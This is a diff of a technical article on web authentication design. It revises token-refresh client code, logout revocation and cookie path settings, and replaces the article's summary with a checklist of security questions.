+  async request(url: string, options: RequestInit = {}) {
+    const headers = { 'Content-Type': 'application/json', ...options.headers }
 
-  /**
-   * Notify all subscribers
-   */
-  notifyTokenRefresh(newToken: string) {
-    this.refreshSubscribers.forEach((callback) => callback(newToken))
-    this.refreshSubscribers = []
-  }
+    let response = await fetch(url, { ...options, headers })
 
-  /**
-   * Refresh Token
-   */
-  private async refreshToken(): Promise<boolean> {
-    if (this.isRefreshing) {
-      // Already refreshing, wait for refresh to complete
-      return new Promise((resolve) => {
-        this.subscribeTokenRefresh(() => resolve(true))
-      })
-    }
-
-    this.isRefreshing = true
-
-    try {
-      const response = await fetch('/api/auth/refresh', {
-        method: 'POST',
-      })
-
-      if (response.ok) {
-        this.isRefreshing = false
-        this.notifyTokenRefresh('refreshed')
-        return true
-      }
-
-      // Refresh failed, redirect to login
-      window.location.href = '/login'
-      return false
-    } catch {
-      this.isRefreshing = false
-      window.location.href = '/login'
-      return false
-    }
-  }
-
-  /**
-   * Make API request (with auto-refresh)
-   */
-  async request<T>(url: string, options: RequestInit = {}): Promise<T> {
-    // Get current Token
-    const accessToken = await this.getAccessToken()
-
-    // Set request headers
-    const headers = {
-      'Content-Type': 'application/json',
-      ...(accessToken && { Authorization: `Bearer ${accessToken}` }),
-      ...options.headers,
-    }
-
-    let response = await fetch(url, {
-      ...options,
-      headers,
-    })
-
-    // If returns 401, try refresh
+    // On 401, silently try to refresh
     if (response.status === 401) {
-      const refreshSuccess = await this.refreshToken()
-
-      if (refreshSuccess) {
-        // Get new Token and retry
-        const newToken = await this.getAccessToken()
-        response = await fetch(url, {
-          ...options,
-          headers: {
-            ...headers,
-            Authorization: `Bearer ${newToken}`,
-          },
-        })
+      const refreshOk = await this.silentRefresh()
+      if (refreshOk) {
+        // Retry the original request with the new token
+        response = await fetch(url, { ...options, headers })
+      } else {
+        // Refresh failed — redirect to login
+        window.location.href = '/login'
+        throw new Error('Authentication expired')
       }
     }
 
-    if (!response.ok) {
-      throw new Error(`Request failed: ${response.status}`)
-    }
-
+    if (!response.ok) throw new Error(`Request failed: ${response.status}`)
     return response.json()
   }
 
-  /**
-   * Get Access Token
-   */
-  private async getAccessToken(): Promise<string | null> {
-    const { cookies } = await import('next/headers')
-    const cookieStore = await cookies()
-    return cookieStore.get('access_token')?.value || null
+  private async silentRefresh(): Promise<boolean> {
+    if (this.isRefreshing) {
+      // Another request is already refreshing. Wait.
+      return new Promise((resolve) => setTimeout(() => resolve(this.silentRefresh()), 100))
+    }
+
+    this.isRefreshing = true
+    try {
+      const res = await fetch('/api/auth/refresh', { method: 'POST' })
+      return res.ok
+    } finally {
+      this.isRefreshing = false
+    }
   }
 }
-
-export const apiClient = new ApiClient()
 ```
 
-### 8.4 Security Advantages of Refresh Tokens Summary
+Key detail: the `isRefreshing` lock. Ten API calls all hit 401 simultaneously. Without it, all ten would try to refresh at once. With it, only the first one issues the refresh request — the other nine wait.
 
-| Advantage                       | Description                                                       |
-| ------------------------------- | ----------------------------------------------------------------- |
-| Shorter attack window           | Access Token only 15 minutes, hackers have limited time           |
-| Controllable session management | Can revoke Refresh Token anytime, force re-authentication         |
-| Fewer password entries          | Users don't need to enter password frequently, better experience  |
-| Multi-device management         | Independent Refresh Token per device, managed separately          |
-| Leak detection                  | Can immediately revoke all tokens if suspicious activity detected |
+#### Revoking on Signout
+
+```typescript
+async function logout() {
+  const cookieStore = await cookies()
+  const refreshToken = cookieStore.get('refresh_token')?.value
+
+  if (refreshToken) {
+    try {
+      const { payload } = await jwtVerify(refreshToken, refreshTokenPublicKey)
+      // Mark as revoked in the database
+      await prisma.refreshTokenMetadata.update({
+        where: { jti: payload.jti as string },
+        data: { revoked: true },
+      })
+    } catch {
+      // Token might already be expired. That is fine.
+    }
+  }
+
+  cookieStore.delete('access_token')
+  cookieStore.delete('refresh_token')
+}
+```
+
+#### Different Cookie Paths
+
+A detail that is easy to miss: the Access Token and Refresh Token should have different Cookie paths.
+
+```typescript
+// Access Token: path='/'  — sent on every request
+cookieStore.set('access_token', accessToken, { path: '/' })
+
+// Refresh Token: path='/api/auth/refresh'  — sent only to the refresh endpoint
+cookieStore.set('refresh_token', refreshToken, {
+  path: '/api/auth/refresh',
+  maxAge: 7 * 24 * 60 * 60,
+})
+```
+
+Why? Minimize the Refresh Token's exposure surface. Normal API requests only need the Access Token. Restricting the Refresh Token's path to the refresh endpoint means it is never transmitted in 99% of requests. The risk of leakage drops dramatically.
+
+### Refresh Token Security Advantages
+
+| Advantage               | Why It Matters                                                                   |
+| ----------------------- | -------------------------------------------------------------------------------- |
+| Minimized attack window | Access Token lives 15 minutes. Even if stolen, the damage is contained.          |
+| Seamless UX             | Users never see a re-login prompt. Silent refresh feels invisible.               |
+| Controllable revocation | You can mark any jti as revoked, instantly killing that session.                 |
+| Multi-device management | Each device gets its own Refresh Token. Kick one device without touching others. |
+| Fast incident response  | Detect a compromise? Revoke all of that user's Refresh Tokens in one query.      |
 
 ---
 
-## 9. Summary: Core Principles of Authentication System Design
+## Nine: How to Judge If Your Auth System Is Good Enough
 
-### 9.1 Password Storage
+I am not giving you a summary. Summaries are someone else thinking for you.
 
-- **Never** store passwords in plain text
-- **Never** use MD5
-- **Recommended** to use Argon2 (best choice) or bcrypt
-- Passwords must be complex enough (uppercase + lowercase + numbers + special characters)
-- Use Zod for server-side validation
+I am giving you a set of questions. Go through them against your own system.
 
-### 9.2 Session Management
+**1. How are you storing passwords?**
 
-- **Recommended** to use JWT as Token
-- Production environment use **RS256** (asymmetric algorithm)
-- Token validity period should be reasonable (Access 15 minutes, Refresh 7 days)
-- **Must**配合 with refresh token mechanism
+- If someone dumped your database right now, would they see real passwords?
+- If two users pick the same password, are their hashes identical?
+- Are you using Argon2 or bcrypt? If it is MD5, stop reading and go fix it.
 
-### 9.3 Cookie Security
+**2. How are you managing tokens?**
 
-- **HttpOnly**: Prevent XSS reading
-- **SameSite**: Prevent CSRF attacks
-- **Secure**: HTTPS required in production
+- How long is your Token expiry? Over an hour? Add a refresh mechanism.
+- What signing algorithm? HS256? Consider RS256.
+- What is in your Token payload? Phone numbers, passwords, ID numbers? Remove them immediately.
 
-### 9.4 Defense Measures
+**3. Are your Cookies configured properly?**
 
-- **Rate limiting**: Prevent brute force attacks
-- **Audit logs**: Record all authentication events
-- **Vague error messages**: Don't tell attackers whether username exists
+- `httpOnly: true`? Set it.
+- `sameSite: 'lax'` or `strict`? Set it.
+- `secure: true` in production? Set it.
+- Is the Refresh Token's Cookie path restricted to the refresh endpoint?
 
-### 9.5 Architecture Design
+**4. Is anyone watching?**
 
-- Server-side use **object-oriented** design (AuthService class)
-- Frontend use **custom Hook** to encapsulate state
-- Next.js Server Actions **expose functions externally**
-- Refresh tokens use **hybrid approach** (metadata storage)
+- Are you logging failed login attempts?
+- Do you have rate limiting? (10 attempts/minute/username is a bare minimum.)
+- Are you monitoring anomalies — like one IP trying 50 different usernames?
 
----
+**5. If a Token is stolen, what can you do?**
 
-Security is not achieved overnight, it's a continuous process. Good architecture allows you to add new protection logic when facing new threats, without having to rebuild the entire system.
+- Can you actively revoke it? (With refresh tokens: yes.)
+- How quickly can you detect the theft? (Depends on your audit log granularity.)
+- Can you revoke all devices at once? (One-click kick-out of all sessions.)
+
+These five questions have no universal answers. Different applications have different requirements — a banking system and a personal blog live in different threat universes.
+
+But if you find yourself thinking "I have never considered that question" for any of them — open your IDE and start patching.
+
+Security is not a project with an end date. It is a continuous race against attackers who never stop. A good architecture means that when a new threat emerges, you add one new defense layer — you do not tear everything down and start over.
+
+You just need one thing: **every auth event is logged, every Token is revocable, every attack path has someone watching.**
+
+The rest is just getting back to sleep at 2 AM.
